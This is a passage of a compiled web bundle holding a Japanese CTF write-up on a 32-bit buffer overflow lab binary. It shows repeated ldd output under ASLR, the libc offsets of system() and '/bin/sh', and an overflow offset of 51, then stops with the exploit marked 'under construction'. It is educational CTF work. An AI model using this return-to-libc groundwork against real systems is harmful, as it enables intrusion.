punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f24000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d26000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f26000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f74000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d76000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f76000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7efa000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7cfc000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7efc000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f2e000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d30000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f30000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f88000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d8a000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f8a000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7fc7000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7dc9000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7fc9000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7fbc000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7dbe000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7fbe000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7ee1000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7ce3000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7ee3000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f1b000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d1d000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f1d000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("p",[t._v("ここで, libc.so.6に存在するsystem関数の相対番地を確認しておく。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ nm -D /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" system\n0003d200 T __libc_system\n00129640 T svcerr_systemerr\n0003d200 W system\n")])])]),a("p",[t._v("すると,　"),a("code",[t._v("0x0003d200")]),t._v("に格納されていることがわかる。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ strings -tx /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" /bin/sh\n 17e0cf /bin/sh\n")])])]),a("p",[t._v("同様にして, /bin/shも調べると"),a("code",[t._v("0x0017e0cf")]),t._v("に格納されていることがわかる。")]),t._v(" "),a("p",[t._v("これらを元に, libc.so.6の番地を"),a("code",[t._v("0xf7ce1000")]),t._v("と仮定して,\nsystem関数を"),a("code",[t._v("0xf7d1e200")]),t._v(",\nbin/shを"),a("code",[t._v("0xf7e8b0cf")]),t._v("と仮定する。")]),t._v(" "),a("p",[t._v("pattern_createとpattoを用いて, OFが起きている部分を確認すると, offsetは"),a("strong",[t._v("51")]),t._v("だった。")]),t._v(" "),a("p",[t._v("これらの情報を元に, 攻撃コードを組み立てる。")]),t._v(" "),a("p",[t._v("工事中...")]),t._v(" "),a("h1",{attrs:{id:"references"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#references"}},[t._v("#")]),t._v(" References")]),t._v(" "),a("ul",[a("li",[t._v("磯井利宜・他 (2015)『セキュリティコンテストチャレンジブック-CTFで学ぼう!情報を守るための戦い方』マイナビ出版")]),t._v(" "),a("li",[a("a",{attrs:{href:"https://gist.github.com/matsubara0507/72dc50c89200a09f7c61",target:"_blank",rel:"noopener noreferrer"}},[t._v("たのしいPwn入門"),a("OutboundLink")],1)])])])}),[],!1,null,null,null);a.default=n.exports}}]);